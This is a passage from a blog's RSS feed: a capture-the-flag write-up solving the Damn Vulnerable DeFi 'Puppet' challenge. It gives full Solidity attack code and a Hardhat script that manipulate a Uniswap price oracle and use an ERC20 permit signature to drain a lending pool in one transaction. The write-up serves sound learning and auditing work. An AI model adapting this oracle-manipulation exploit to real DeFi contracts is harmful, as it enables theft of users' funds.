&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;expect&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;provider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getTransactionCount&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;)).&lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;eq&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;everything-in-one-transaction&#34;&gt;Everything in one transaction&lt;/h1&gt;
&lt;p&gt;Everything should be done with only the &lt;code&gt;player&lt;/code&gt; account, so we shouldn&amp;rsquo;t create another account just to bypass this condition.&lt;/p&gt;
&lt;p&gt;To perform all of these calls; swapping tokens with the Uniswap pool, then borrowing tokens from the lending pool, we can create a contract which &lt;strong&gt;executes everything in its constructor&lt;/strong&gt;, using our 1 transaction to deploy the contract, sending all necessary ether along with it.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;PuppetAttack.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
contract PuppetAttack {
    constructor (
        address owner,
        DamnValuableToken token,
        PuppetPool lendingPool,
        IUniswapExchange uniswapExchange
    ) payable {
        // swap all our DVTs for ETH
        token.approve(address(uniswapExchange), value);
        uniswapExchange.tokenToEthSwapInput(
            1000 * 10**18, // swap 1000 DVT
            9.9 * 10**18, // for 9.9 ETH minimum
            block.timestamp &amp;#43; 3600 // deadline (not important)
        );

        // drain lending pool&amp;#39;s DVTs, sending them to owner (player)
        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
            lendingPoolBalance
        );
        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;5&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
it(&amp;#39;Execution&amp;#39;, async function () {
    /** CODE YOUR SOLUTION HERE */

    attack = await (await ethers.getContractFactory(&amp;#39;PuppetAttack&amp;#39;, player)).deploy(
        player.address,
        token.address,
        lendingPool.address,
        uniswapExchange.address,
        {
            // send most ETH to the attack contract, keeping some for gas
            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
            gasLimit: 1e7
        }
    );
});
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The above code will fail, however, as there is a significant problem: for the attack contract to trade our DVTs, we need to allow our DVTs to be spent by the attack contract - how can we do this without using up another transaction?&lt;/p&gt;
&lt;h1 id=&#34;erc20-permit-approvals&#34;&gt;ERC20 Permit Approvals&lt;/h1&gt;
&lt;p&gt;We can&amp;rsquo;t simply &lt;code&gt;transfer&lt;/code&gt; our tokens to the attack contract, or &lt;code&gt;approve&lt;/code&gt; the attack contract to use our tokens, without a transaction.&lt;/p&gt;
&lt;p&gt;Fortunately if we look closer at the DVT contract, we notice it uses &lt;a href=&#34;https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol&#34;&gt;solmate&amp;rsquo;s ERC20 implementation&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;solmate/src/tokens/ERC20.sol&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This particular implementation includes the &lt;code&gt;permit&lt;/code&gt; function, which was designed as a gas efficient way to &lt;code&gt;approve&lt;/code&gt; a spender. It is essentially an &lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-2612&#34;&gt;extension to ERC20&lt;/a&gt; to allow others to spend your tokens &lt;strong&gt;in a single transaction&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;For example, say you wish to exchange some tokens. Normally you would need to call &lt;code&gt;approve(exchange, amount)&lt;/code&gt; to allow &lt;code&gt;exchange&lt;/code&gt; to spend &lt;code&gt;amount&lt;/code&gt; of your tokens, then the exchange can take your tokens by doing &lt;code&gt;transferFrom(you, exchange, amount)&lt;/code&gt;. This requires a total of 2 transactions, one from you and one from the exchange. &lt;strong&gt;There is no way to do both in the same transaction&lt;/strong&gt; (unless you are a contract).&lt;/p&gt;
&lt;p&gt;With &lt;code&gt;permit&lt;/code&gt;, you can cryptographically sign a &lt;code&gt;Permit&lt;/code&gt; which contains details such as the &lt;code&gt;spender&lt;/code&gt; and &lt;code&gt;amount&lt;/code&gt;, obtaining a signature. Then, you send this signature to the exchange, which calls &lt;code&gt;permit&lt;/code&gt; on the token contract, approving &lt;code&gt;spender&lt;/code&gt; to spend &lt;code&gt;amount&lt;/code&gt; tokens. The key difference is that the signing is done off-chain, which means the exchange can &lt;strong&gt;obtain allowance to your tokens and spend them in the same transaction&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;This is perfect for our scenario, as our attacking contract cannot spend our DVTs without us sending or approving the DVTs first.&lt;/p&gt;
&lt;h1 id=&#34;deterministic-contract-addresses&#34;&gt;Deterministic Contract Addresses&lt;/h1&gt;
&lt;p&gt;There is another problem - we need to specify the &lt;code&gt;spender&lt;/code&gt; when signing a permit off-chain - how do we get our attack contract&amp;rsquo;s address before deploying it?&lt;/p&gt;
&lt;p&gt;We can actually predict the contract&amp;rsquo;s address before its deployment, as &lt;a href=&#34;https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed&#34;&gt;contract addresses are deterministic&lt;/a&gt;, based off the deploying account&amp;rsquo;s address and nonce.&lt;/p&gt;
&lt;p&gt;In our case, since Hardhat tests use same account addresses, we can simply deploy and print out the attack contract&amp;rsquo;s address, which will remain constant.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;it&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Execution&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;/** CODE YOUR SOLUTION HERE */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getContractFactory&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PuppetAttack&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;)).&lt;span style=&#34;color:#a6e22e&#34;&gt;deploy&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Attack contract: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;contract&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PuppetAttack&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Deploying an empty contract as shown above gives us the attack contract&amp;rsquo;s address, which stays constant if we re-run the tests.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Attack contract: 0x8464135c8F25Da09e49BC8782676a84730C318bC
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;putting-it-all-together&#34;&gt;Putting it all together&lt;/h1&gt;
&lt;p&gt;Figuring out how to sign the permit probably took the longest for this challenge. I eventually found &lt;a href=&#34;https://forum.openzeppelin.com/t/erc20-permit-call/34975&#34;&gt;this thread&lt;/a&gt; and modified the code to work. Afterwards I found &lt;a href=&#34;https://github.com/dmihal/eth-permit&#34;&gt;&lt;code&gt;eth-permit&lt;/code&gt;&lt;/a&gt; which required less code, but requires installing another node module, so I will show the original way I used.&lt;/p&gt;
&lt;p&gt;Otherwise, most of the code is simply combining what was shown in the previous sections, with the addition of the permit.&lt;/p&gt;
&lt;p&gt;Final attack contract code:



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;300&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;300&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;PuppetAttack.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import &amp;#34;../DamnValuableToken.sol&amp;#34;;
import &amp;#34;./PuppetPool.sol&amp;#34;;
import &amp;#34;./IUniswapExchange.sol&amp;#34;;

/**
 * @title PuppetAttack
 * @author teddyctf (https://thesavageteddy.github.io/posts/puppet-damnvulnerabledefi/)
 */

contract PuppetAttack {
    constructor (
        address owner,
        DamnValuableToken token,
        PuppetPool lendingPool,
        IUniswapExchange uniswapExchange,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v, bytes32 r, bytes32 s
    ) payable {
        // use permit and transfer tokens to this contract
        token.permit(
            owner,
            spender,
            value,
            deadline,
            v, r, s
        );
        token.transferFrom(owner, address(this), value);

        // swap all our DVTs for ETH
        token.approve(address(uniswapExchange), value);
        uniswapExchange.tokenToEthSwapInput(
            value, // swap all our DVTs
            9.9 * 10**18, // for 9.9 ETH minimum
            block.timestamp &amp;#43; 3600 // deadline (not important)
        );

        // drain lending pool&amp;#39;s DVTs, sending them to owner (player)
        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
            lendingPoolBalance
        );
        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;

&lt;/p&gt;
&lt;p&gt;Relevant Hardhat solve script (full code &lt;a href=&#34;https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/puppet.challenge.js&#34;&gt;here&lt;/a&gt;):&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;200&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;200&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
it(&amp;#39;Execution&amp;#39;, async function () {
    /** CODE YOUR SOLUTION HERE */

    // Attack contract address we obtained previously
    let attackAddress = &amp;#34;0x8464135c8F25Da09e49BC8782676a84730C318bC&amp;#34;
    let spender = attackAddress

    // Hardhat requires a Wallet to obtain the signed
    // transaction data, so make a Wallet for the player
    const accounts = config.networks.hardhat.accounts;
    const index = 1; // wallet of player
    const playerWallet = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path &amp;#43; `/${index}`);

    expect(playerWallet.address).eq(player.address)

    const chainId = (await ethers.provider.getNetwork()).chainId
    const nonce = await token.nonces(playerWallet.address)
    const name = await token.name()

    // Number of tokens to be sent
    const value = 1000n * 10n**18n
    
    // Unix timestamp for deadline
    const deadline = (await ethers.provider.getBlock(&amp;#39;latest&amp;#39;)).timestamp &amp;#43; 3600

    // Define Signature
    const domain = {
        name: name,
        version: &amp;#34;1&amp;#34;,
        verifyingContract: token.address,
        chainId: chainId,
    }

    // Define types
    const types = {
        Permit: [
            {name: &amp;#34;owner&amp;#34;, type: &amp;#34;address&amp;#34;},
            {name: &amp;#34;spender&amp;#34;, type: &amp;#34;address&amp;#34;},
            {name: &amp;#34;value&amp;#34;, type: &amp;#34;uint256&amp;#34;},
            {name: &amp;#34;nonce&amp;#34;, type: &amp;#34;uint256&amp;#34;},
            {name: &amp;#34;deadline&amp;#34;, type: &amp;#34;uint256&amp;#34;},
        ]
    }

    // Define transaction
    const values = {
        owner: playerWallet.address,
        spender: spender,
        value: value,
        nonce: nonce,
        deadline: deadline,
    }

    // Sign data
    const signature = await playerWallet._signTypedData(domain, types, values);

    // Split signature
    const sig = ethers.utils.splitSignature(signature);

    attack = await (await ethers.getContractFactory(&amp;#39;PuppetAttack&amp;#39;, player)).deploy(
        player.address,
        token.address,
        lendingPool.address,
        uniswapExchange.address,
        spender,
        value,
        deadline,
        sig.v, sig.r, sig.s,
        {
            // send most ETH to the attack contract, keeping some for gas
            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
            gasLimit: 1e7
        }
    );
});
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;



  &lt;img src=&#34;./img/solved.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-width: 80%;&#34;  /&gt;


&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This challenge was interesting, and I learnt a lot about ERC20 permits and oracle manipulation. Despite being the first out of a set of three challenges, its difficulty deceived me with the one transaction requirement.&lt;/p&gt;
&lt;p&gt;Huge thanks to &lt;a href=&#34;https://twitter.com/farazsth98&#34;&gt;&lt;code&gt;Faith&lt;/code&gt;&lt;/a&gt; for helping with the one transaction requirement, and for teaching me a lot throughout my Web3 learning journey.&lt;/p&gt;
&lt;p&gt;As this is my first Web3 post, if I&amp;rsquo;ve made any errors or anything to improve on, please let me know on Discord &lt;code&gt;thesavageteddy&lt;/code&gt; or Twitter/X &lt;a href=&#34;https://twitter.com/teddyctf&#34;&gt;&lt;code&gt;@teddyctf&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Having almost finished DamnVulnerableDefi, I&amp;rsquo;m looking at getting into auditing contracts soon!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
